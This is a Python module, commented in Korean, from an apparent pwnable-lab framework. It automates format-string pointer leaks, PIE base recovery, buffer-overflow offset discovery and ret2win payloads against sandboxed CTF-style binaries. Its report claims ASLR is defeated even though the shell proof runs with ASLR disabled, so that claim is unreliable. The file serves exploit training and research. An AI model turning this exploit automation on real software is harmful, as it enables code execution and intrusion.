"""PIE 진짜 in-band leak 자동 구성 — 포맷스트링으로 PIE base 를 유출해 셸 증명.

다른 PIE 경로(:mod:`sandbox.pie`)는 로드 base 를 ASLR-off **로컬 관측**으로 얻어
*로컬* 익스 가능성만 증명한다. 이 모듈은 대상이 **스스로 흘리는 정보**(포맷스트링
취약점)로 base 를 런타임에 복원한다 — ASLR 이 켜져 있어도 성립하는 진짜 leak 이다.

정적 포맷스트링 인식은 어렵지만, 샌드박스에서 **동적으로 probe** 하면 우회할 수 있다:

1. **stage2 오프셋 확정**: cyclic 을 2단계로 흘려 오버플로 반환 오프셋을 동적 확정.
2. **leak 캘리브레이션**: ASLR 을 끈 채 로드 base 를 관측(오라클)하고, ``%N$p`` 를
   위치별로 주입해 **바이너리 코드 포인터를 유출하는 인자 위치와 그 정적 오프셋**
   ``O`` 를 찾는다(``leaked = base + O``, ASLR 무관 상수). 오라클은 *어느 위치/오프셋*
   인지 식별하는 데만 쓰인다 — 익스 시 base 는 유출값에서 계산한다.
3. **셸 증명**: leak → ``base = leaked - O`` → ``A*offset [+ ret] + win`` 을 2단계로
   보내 PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려 셸 획득을 증명한다.
"""

from __future__ import annotations

import re
import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import (
    binary_exec_range,
    find_ret_gadget,
    is_pie,
    ret2win_target,
)
from pwnable_lab.elf.parser import ElfImage, parse_elf
from pwnable_lab.payload.cyclic import cyclic, cyclic_find
from pwnable_lab.sandbox.runner import (
    SandboxLimits,
    resolve_pie_base,
    run_two_stage,
    run_two_stage_shell,
    run_with_input,
)

# 유출값 파싱: 첫 0x... 16진 토큰.
_HEX = re.compile(rb"0x[0-9a-fA-F]+")

# probe 할 포맷스트링 인자 위치(첫 몇 개는 레지스터/프레임 잡값이라 6부터).
_PROBE_START = 6
_PROBE_END = 60


def auto_fmt_leak_pie(
    binary_path: str,
    *,
    limits: SandboxLimits | None = None,
    cyclic_length: int = 400,
) -> dict:
    """PIE 바이너리에서 포맷스트링 in-band leak 으로 base 를 복원해 ret2win 셸 증명."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if not is_pie(image):
        return {"attempted": False, "reason": "not-pie"}
    win = ret2win_target(image)
    if win is None:
        return {"attempted": False, "reason": "no-win-target"}

    limits = limits or SandboxLimits()

    # 1) 오버플로(stage2) 반환 오프셋을 cyclic 2단계로 동적 확정.
    offset = _confirm_stage2_offset(binary_path, limits, cyclic_length)
    if offset is None:
        return {"attempted": False, "reason": "no-overflow"}

    # 2) 포맷스트링 leak 위치·오프셋 캘리브레이션(ASLR-off 오라클).
    calib = _calibrate_leak(binary_path, image, limits)
    if calib is None:
        return {"attempted": False, "reason": "no-fmt-leak"}
    position, leak_offset = calib

    # 3) leak → base → rebase ret2win → PTY 셸 증명(movaps 정렬 변형 포함).
    win_name, win_off = win
    ret_off = find_ret_gadget(image)
    prelude = f"%{position}$p".encode()

    variants: list[bool] = [False] if ret_off is None else [False, True]
    for align in variants:

        def make_second(line: bytes, align: bool = align) -> bytes:
            m = _HEX.search(line)
            if not m:
                return b"A" * offset  # leak 실패 시 정렬만 깨 크래시
            base = int(m.group(), 16) - leak_offset
            payload = b"A" * offset
            if align and ret_off is not None:
                payload += (base + ret_off).to_bytes(8, "little")
            payload += (base + win_off).to_bytes(8, "little")
            return payload

        marker = "PWNPILOT_" + secrets.token_hex(4)
        proof, leaked = run_two_stage_shell(
            binary_path,
            make_second,
            marker=marker,
            prelude=prelude,
            limits=limits,
            disable_aslr=True,
        )
        if proof.shell_spawned:
            leaked_val = _first_hex(leaked)
            base = None if leaked_val is None else leaked_val - leak_offset
            return _report(
                win,
                offset,
                position,
                leak_offset,
                align,
                leaked_val,
                base,
                True,
                "shell-proven",
                proof.as_dict(),
            )

    return _report(
        win,
        offset,
        position,
        leak_offset,
        False,
        None,
        None,
        False,
        "did-not-spawn-shell",
        None,
    )


def _confirm_stage2_offset(
    binary_path: str, limits: SandboxLimits, cyclic_length: int
) -> int | None:
    """cyclic 을 2단계로 흘려 오버플로 반환 오프셋을 동적 확정한다.

    stage1(leak read)에는 개행으로 끝나는 짧은 입력을 보내 printf 가 개행을 출력하게
    해 2단계 트리거를 만들고, stage2 에 cyclic 을 보내 크래시의 RIP/스택 슬롯에서
    :func:`cyclic_find` 로 오프셋을 역산한다(WSL2 는 비정상 ret 를 faulting 명령으로
    보고하므로 스택 슬롯 경로가 필수).
    """

    pattern = cyclic(cyclic_length)
    obs, _ = run_two_stage(
        binary_path, lambda _line: pattern + b"\n", prelude=b"x\n", limits=limits
    )
    if not obs.crashed:
        return None
    if obs.rip is not None:
        off = cyclic_find(obs.rip & 0xFFFFFFFF)
        if off >= 0:
            return off
    for _addr, value in obs.stack_words:
        off = cyclic_find(value & 0xFFFFFFFF)
        if off >= 0:
            return off
    return None


def _calibrate_leak(
    binary_path: str, image: ElfImage, limits: SandboxLimits
) -> tuple[int, int] | None:
    """포맷스트링 인자 위치를 훑어 바이너리 코드 포인터를 유출하는 위치를 찾는다.

    ASLR 을 끈 로드 base(오라클)를 기준으로, ``%N$p`` 유출값이 바이너리 실행 범위
    ``[base+lo, base+hi)`` 안에 드는 첫 위치를 반환한다. 반환 오프셋 ``O = leaked -
    base`` 는 코드 주소라 ASLR 무관 상수다. 2회 관측이 일치할 때만 채택(잡값 배제).
    없으면 None(포맷스트링 취약점이 없거나 코드 포인터가 스택에 안 보임).
    """

    rng = binary_exec_range(image)
    if rng is None:
        return None
    lo, hi = rng
    base_res = resolve_pie_base(binary_path, limits=limits)
    if not base_res.confirmed or base_res.base is None:
        return None
    base = base_res.base

    for position in range(_PROBE_START, _PROBE_END + 1):
        offsets: set[int] = set()
        ok = True
        for _ in range(2):
            leaked = _probe_position(binary_path, position, limits)
            if leaked is None or not (base + lo <= leaked < base + hi):
                ok = False
                break
            offsets.add(leaked - base)
        if ok and len(offsets) == 1:
            return position, offsets.pop()
    return None


def _probe_position(
    binary_path: str, position: int, limits: SandboxLimits
) -> int | None:
    """``%{position}$p`` 를 주입해 유출된 첫 포인터 값을 돌려준다(ASLR-off)."""

    fmt = f"%{position}$p".encode() + b"\n"
    obs = run_with_input(
        binary_path, fmt, capture_stdout=True, limits=limits, disable_aslr=True
    )
    return _first_hex(obs.stdout)


def _first_hex(data: bytes) -> int | None:
    m = _HEX.search(data)
    if not m:
        return None
    return int(m.group(), 16)


def _report(
    win: tuple[str, int],
    offset: int,
    position: int,
    leak_offset: int,
    align: bool,
    leaked: int | None,
    base: int | None,
    succeeded: bool,
    reason: str,
    proof: dict | None,
) -> dict:
    win_name, win_off = win
    report: dict = {
        "attempted": True,
        "technique": "fmt-leak-pie",
        "target_name": win_name,
        "target_offset_hex": f"0x{win_off:x}",
        "overflow_offset": offset,
        "fmt_position": position,
        "leak_offset_hex": f"0x{leak_offset:x}",
        "alignment_ret_gadget": align,
        "leaked_hex": None if leaked is None else f"0x{leaked:x}",
        "base_hex": None if base is None else f"0x{base:x}",
        "target_runtime_hex": None if base is None else f"0x{base + win_off:x}",
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
        # base 가 유출값에서 계산되므로 ASLR 이 켜져 있어도 성립하는 진짜 leak 이다.
        "aslr": "defeated-via-inband-leak",
    }
    if proof is not None:
        report["shell_proof"] = proof
    return report
